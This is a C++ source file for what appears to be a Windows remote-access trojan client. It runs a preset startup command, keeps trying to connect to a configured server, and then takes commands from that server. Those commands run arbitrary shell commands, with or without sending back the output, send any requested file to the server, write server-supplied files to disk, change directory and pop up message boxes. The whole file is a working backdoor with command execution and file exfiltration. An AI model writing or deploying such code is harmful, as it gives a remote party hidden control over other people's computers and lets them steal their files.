#include"../setting/precmd.ini"
#include"../setting/port.ini"
#include"../setting/ip.ini"
#include"../include/lzmsocket.h"
#include<iostream>
#include<string.h>
#include<unistd.h>
#include<stdio.h>
#include<thread>
using namespace std;
char msg[1010],txt[1010],tmp[1010],opt[1010],buff[1010],uuu[1010]="continue",vvv[1010]="end",www[1010]="failed",sss[1010],ttt[1000]="OK",cwd[1010];
void msgbox(char *txt,char *title,char *s){
	int ico=0;
	if(strcmp(s,"x")==0)ico=MB_ICONERROR;
	if(strcmp(s,"!")==0)ico=MB_ICONWARNING;
	if(strcmp(s,"i")==0)ico=MB_ICONASTERISK;
	if(strcmp(s,"?")==0)ico=MB_ICONQUESTION;
	thread(MessageBox,nullptr,txt,title,MB_OK|MB_SYSTEMMODAL|ico).detach();
	//MessageBox(nullptr,txt,title,MB_OK|MB_SYSTEMMODAL|MB_SETFOREGROUND|ico);
}
int main(){
	system((char*)CLIENT_COMMAND);
	SOCKET s=init();
	if(s==INVALID_SOCKET){cleansocket();return 0;}
	bool flag=false;
	for(int t=1;t<=60;t++){
		if(connect_server(s,(char*)IP,PORT)){flag=true;break;}
		Sleep(5000);
	}
	if(!flag){closesocket(s),cleansocket();return 0;}
	SetCurrentDirectory(getenv("userprofile"));
	while(true){
		getmsg(s,msg,1000);
		if(strcmp(msg,"cwd")==0){
			_getcwd(cwd,1000);
			sendmsg(s,cwd,1000);
			continue;
		}else if(strcmp(msg,"cmdv")==0){
			getmsg(s,msg,1000);
			FILE *f=popen(msg,"r");
			if(f==nullptr)continue;
			continue;
		}else if(strcmp(msg,"cmdd")==0){
			getmsg(s,msg,1000);
			FILE *f=popen(msg,"r");
			if(f==nullptr)continue;
			int len=512;
			while(len==512){
				memset(buff,0,1000);
				len=fread(buff,1,512,f);
				if(!len||len==EOF) break;
				sendmsg(s,uuu,1000);
				sendmsg(s,buff,1000);
			}
			sendmsg(s,vvv,1000);
			continue;
		}else if(strcmp(msg,"pull")==0){
			getmsg(s,msg,1000);
			FILE *f=fopen(msg,"rb");
			if(f==nullptr){sendmsg(s,www,1000);continue;}
			else sendmsg(s,ttt,1000);
			int len=512;
			while(len==512){
				memset(buff,0,1000);
				memset(sss,0,1000);
				len=fread(buff,1,512,f);
				sprintf(sss,"%d",len);
				if(!len||len==EOF) break;
				sendmsg(s,sss,1000);
				sendmsg(s,buff,1000);
			}
			memset(sss,0,1000);sss[0]='0';
			sendmsg(s,sss,1000);fclose(f);
			continue;
		}else if(strcmp(msg,"push")==0){
			getmsg(s,msg,1000);
			if(strcmp(msg,"failed")==0) continue;
			FILE *f=fopen(msg,"wb");
			getmsg(s,buff,1000);
			int len;
			while(strcmp(buff,"0")!=0){
				sscanf(buff,"%d",&len);
				getmsg(s,buff,1000);
				fwrite(buff,1,len,f);
				getmsg(s,buff,1000);
			}
			fclose(f);
			continue;
		}else if(strcmp(msg,"cdc")==0){
			getmsg(s,msg,1000);
			if(_access(msg,0)==-1){sendmsg(s,(char*)"-1",1000);continue;}
			SetCurrentDirectory(msg);
			sendmsg(s,(char*)"0",1000);
			continue;
		}else if(strcmp(msg,"msg")==0){
			getmsg(s,txt,1000);
			getmsg(s,tmp,1000);
			getmsg(s,opt,1000);
			msgbox(txt,tmp,opt);
			continue;
		}else if(strcmp(msg,"exit")==0)break;
	}
	closesocket(s),cleansocket();
	return 0;
}
